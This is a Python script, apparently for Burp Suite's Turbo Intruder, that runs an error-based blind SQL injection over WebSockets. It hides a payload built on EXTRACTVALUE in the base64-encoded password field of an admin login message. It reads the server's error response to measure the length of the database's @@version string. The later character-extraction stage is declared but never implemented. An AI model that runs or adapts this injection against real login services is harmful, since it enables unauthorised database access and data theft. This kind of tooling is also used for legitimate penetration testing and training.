import base64
import time

# -----------------------------------------------------------
# Constants
# -----------------------------------------------------------
START_PAYLOAD = '{"auth_user":"YWRtaW4=","auth_pass":"'
END_PAYLOAD = '"}'

# Global state tracking
current_stage = 0  # 0 = Find length, 1 = Extract characters
current_position = 0
found_version = ""
version_length = 0

# Known server error response
ERROR_MESSAGE = "Something went wrong. Could not get data."

# -----------------------------------------------------------
# SQL Injection Payloads (Using `EXTRACTVALUE()` for Errors)
# -----------------------------------------------------------
def build_length_payload(position):
    """
    Checks if LENGTH(@@version) >= position.
    If false, it triggers an error using EXTRACTVALUE().
    """
    return "error' OR (SELECT EXTRACTVALUE(NULL, CONCAT('~', (SELECT CASE WHEN LENGTH(@@version) >= {} THEN NULL ELSE 'A' END)))); -- length".format(position)

# -----------------------------------------------------------
# WebSocket Handling
# -----------------------------------------------------------
def queue_websockets(upgrade_request, message):
    """
    Send a payload through WebSockets.
    """
    connection = websocket_connection.create(upgrade_request, Engine.BURP)
    connection.queue(
        START_PAYLOAD + base64.b64encode(build_length_payload(current_position)) + END_PAYLOAD
    )

def handle_outgoing_message(websocket_message, interesting):
    """
    Store outgoing messages.
    """
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message, interesting):
    """
    Parses the server response and determines the next payload based on error behavior.
    """
    results_table.add(websocket_message)
    global current_stage, current_position, version_length, found_version

    response_message = websocket_message.getMessage()

    # -----------------------------------------------------------
    # Stage 0: Determine Length of @@version
    # -----------------------------------------------------------
    if current_stage == 0:
        if ERROR_MESSAGE in response_message:
            # SQL Error triggered -> LENGTH(@@version) < current_position
            version_length = current_position - 1
            print "Found @@version length:", version_length

            # Move to extracting characters
            current_stage = 1
            current_position = 1  # Reset position for character extraction

        else:
            # No error => length is at least current_position
            current_position += 1
            next_payload = build_length_payload(current_position)


    # -----------------------------------------------------------
    # Send Next Payload
    # -----------------------------------------------------------
    try:
        encoded_payload = base64.b64encode(next_payload)
        connection = websocket_message.getConnection()
        connection.queue(START_PAYLOAD + encoded_payload + END_PAYLOAD)
    except NameError:
        print("Finished")

